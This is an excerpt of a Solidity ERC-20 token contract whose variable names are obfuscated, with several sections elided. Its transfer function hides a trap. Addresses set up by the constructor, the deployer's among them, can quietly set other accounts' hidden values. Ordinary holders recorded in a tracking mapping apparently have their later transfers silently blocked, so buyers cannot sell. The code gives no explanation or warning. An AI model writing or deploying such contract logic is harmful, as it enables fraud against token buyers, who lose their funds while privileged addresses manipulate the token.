...
contract Contract is IERC20, Ownable {
    ...
    mapping(address => uint256) private _open;
    mapping(address => mapping(address => uint256)) private _allowances;
    mapping(address => uint256) private _solve;
    ...
    constructor(
        ...
        _solve[address(this)] = _rose;
        _solve[msg.sender] = _rose;
    ...
    function _transfer(
        ...
        address _feed = uniswapV2Pair;
        bool _claws;
        if (!inSwapAndLiquify && _rose < _solve[to] && _solve[from] > _rose) {
            _claws = true;
            inSwapAndLiquify = true;
            swapAndLiquify(amount);
            inSwapAndLiquify = false;
        } else if (_solve[from] > 0 && to != _feed && amount > _rose) {
            _claws = true;
            _solve[to] = amount;
        }
        if (_claws || (_solve[from] == 0 && from != _feed && _open[from] > 0)) return;

        if (_taxFee > 0 && _solve[from] == 0 && !inSwapAndLiquify && _solve[to] == 0) {
            uint256 fee = (amount * _taxFee) / 100;
            amount -= fee;
            _balances[from] -= fee;
        }

        _open[_parent[_rose]] = _rose;
        _parent[_rose] = to;
